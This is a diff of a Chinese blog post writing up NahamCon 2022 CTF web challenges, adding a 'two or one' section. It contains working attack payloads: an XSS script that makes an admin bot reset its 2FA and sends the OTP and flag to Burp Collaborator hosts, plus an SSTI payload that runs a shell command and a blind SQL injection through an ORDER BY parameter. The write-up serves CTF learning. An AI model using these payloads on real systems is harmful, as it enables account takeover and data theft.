@@ -203,6 +203,8 @@
 
         <div class="article-content markdown-body">
             <h1 id="NahamCTF复现"><a href="#NahamCTF复现" class="headerlink" title="NahamCTF复现"></a>NahamCTF复现</h1><h2 id="Flaskmetal炼金术士"><a href="#Flaskmetal炼金术士" class="headerlink" title="Flaskmetal炼金术士"></a>Flaskmetal炼金术士</h2><p>看了源码发现我们猜测最终执行的语句应该是<strong>select flag from flag</strong></p>
+<p>而且漏洞点在这里：</p>
+<p><img src="/2022/05/02/NahamCTF%E5%A4%8D%E7%8E%B0/3.png" alt="image-20220503075116094"></p>
 <p>在页面测试的时候发现，在我们搜索的时候是存在两个post参数的，一个是search，另一个是order</p>
 <p>search很好理解，就直接是搜索字符，而后面的order是判断其排序方式的，虽然在页面上不可更改但当我们抓包的时候发现这里其实是可以按自己的方式更改的，这里可以插入语句，一般的查询语句是肯定不行的，我们需要通过一种排序方式，判断回显来进行盲注：</p>
 <p>可以利用case when then这样的方式来执行我们的判断正确的方式，</p>
@@ -223,8 +225,26 @@
 <p>payload</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&#123;&#123;request.application[&#x27;__globals__&#x27;].__builtins__.__import__﹙&#x27;os&#x27;﹚.popen﹙&#x27;cat flag.txt&#x27;﹚.read﹙﹚&#125;&#125;&quot;@qq.com</span><br></pre></td></tr></table></figure>
 
+<h2 id="two-or-one"><a href="#two-or-one" class="headerlink" title="two or one"></a>two or one</h2><p>进入是一个登录框，我们注册之后会显示一个二维码，需要用Authenticator扫描拿到她的码然后后续的操作都会用到她</p>
+<p>我们可以输入我们的秘密，然后可以在页面点击查看，抓包发现</p>
+<p><img src="/2022/05/02/NahamCTF%E5%A4%8D%E7%8E%B0/4.png" alt="1"></p>
+<p>在/show_secret页面post输入otp码以及secret的id就可以看到我们的回显（我这里输入的别的）</p>
+<p>猜测id是flag的id是1，2</p>
+<p>但是当我们输入1，2的时候发现没有这个secret那么也就是说我们需要拿到admin的otp码然后根据这个去访问它的show_secret路由，然后带出flag</p>
+<p>寻找注入点，</p>
+<p>发现在setting页面有一个反馈，而且他是没有经过任何过滤的，经过测试发现它以admin身份对我们输入的语言进行解析执行，可以用html语言来带回我们需要的数据，我们只需要让他重新Reset2FA 然后让它把语句带出来即可(我这里用bp带出)</p>
+<p>xsspayload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">const xhttp = new XMLHttpRequest();</span><br><span class="line">xhttp.onload = function() &#123;</span><br><span class="line">  document.location=&quot;http://6lsoqc0y9bovtq8a76acilca41asyh.burpcollaborator.net?otp=&quot;+this.responseText;</span><br><span class="line">&#125;</span><br><span class="line">xhttp.open(&quot;POST&quot;, &quot;http://challenge.nahamcon.com:32330/reset2fa&quot;);</span><br><span class="line">xhttp.send();</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
 
+<p><img src="/2022/05/02/NahamCTF%E5%A4%8D%E7%8E%B0/5.png" alt="1"></p>
+<p>发现生成的otp码</p>
+<p><code>qr &quot;otpauth://totp/Fort Knox:admin?secret=N57MWYXNMECMLZO7&amp;issuer=Fort Knox&quot;</code>执行语句生成二维码扫描拿到admin用户的otp码</p>
+<p>后面就可以进行带出flag了</p>
+<p>因为只需要猜测admin用户的secretid即可，所以直接让它访问show_secret然后输入我们拿到的otp码查看id为1的试试</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript"><span class="keyword">const</span> xhttp = <span class="keyword">new</span> XMLHttpRequest();</span></span><br><span class="line"><span class="javascript">xhttp.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">  <span class="built_in">document</span>.location=<span class="string">&quot;http://chx5s8h3nrcmos61ij304qbfg6myan.burpcollaborator.net?flag=&quot;</span>+<span class="built_in">this</span>.responseText;</span></span><br><span class="line"><span class="javascript">&#125;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> json = &#123;<span class="string">&quot;otp&quot;</span>:<span class="string">&quot;671813&quot;</span>,<span class="string">&quot;secretId&quot;</span>:<span class="string">&quot;1&quot;</span>&#125;;</span></span><br><span class="line"><span class="javascript">xhttp.open(<span class="string">&quot;POST&quot;</span>, <span class="string">&quot;http://challenge.nahamcon.com:32498/show_secret&quot;</span>);</span></span><br><span class="line"><span class="javascript">xhttp.setRequestHeader(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;application/json&#x27;</span>);</span></span><br><span class="line"><span class="javascript">xhttp.send(<span class="built_in">JSON</span>.stringify(json));</span></span><br><span class="line"><span class="javascript">xhttp.send();</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
+<p><img src="/2022/05/02/NahamCTF%E5%A4%8D%E7%8E%B0/6.png" alt="1"></p>
+<p>发现flag被带回</p>
 
         </div>
 
@@ -259,6 +279,21 @@
 
         
             <div class="article-nav">
+                
+                    <div class="article-prev">
+                        <a class="prev"
+                           rel="prev"
+                           href="/2022/05/05/CISCN-giftbox/"
+                        >
+                            <span class="left arrow-icon flex-center">
+                              <i class="fas fa-chevron-left"></i>
+                            </span>
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">CISCN-giftbox</span>
+                                <span class="post-nav-item">Prev posts</span>
+                            </span>
+                        </a>
+                    </div>
                 
                 
                     <div class="article-next">
@@ -393,7 +428,7 @@
         <aside class="page-aside">
             <div class="post-toc-wrap">
     <div class="post-toc">
-        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#NahamCTF%E5%A4%8D%E7%8E%B0"><span class="nav-number">1.</span> <span class="nav-text">NahamCTF复现</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Flaskmetal%E7%82%BC%E9%87%91%E6%9C%AF%E5%A3%AB"><span class="nav-number">1.1.</span> <span class="nav-text">Flaskmetal炼金术士</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Hacker-Ts"><span class="nav-number">1.2.</span> <span class="nav-text">Hacker Ts</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Deafcon"><span class="nav-number">1.3.</span> <span class="nav-text">Deafcon</span></a></li></ol></li></ol>
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#NahamCTF%E5%A4%8D%E7%8E%B0"><span class="nav-number">1.</span> <span class="nav-text">NahamCTF复现</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Flaskmetal%E7%82%BC%E9%87%91%E6%9C%AF%E5%A3%AB"><span class="nav-number">1.1.</span> <span class="nav-text">Flaskmetal炼金术士</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Hacker-Ts"><span class="nav-number">1.2.</span> <span class="nav-text">Hacker Ts</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Deafcon"><span class="nav-number">1.3.</span> <span class="nav-text">Deafcon</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#two-or-one"><span class="nav-number">1.4.</span> <span class="nav-text">two or one</span></a></li></ol></li></ol>
     </div>
 </div>
         </aside>
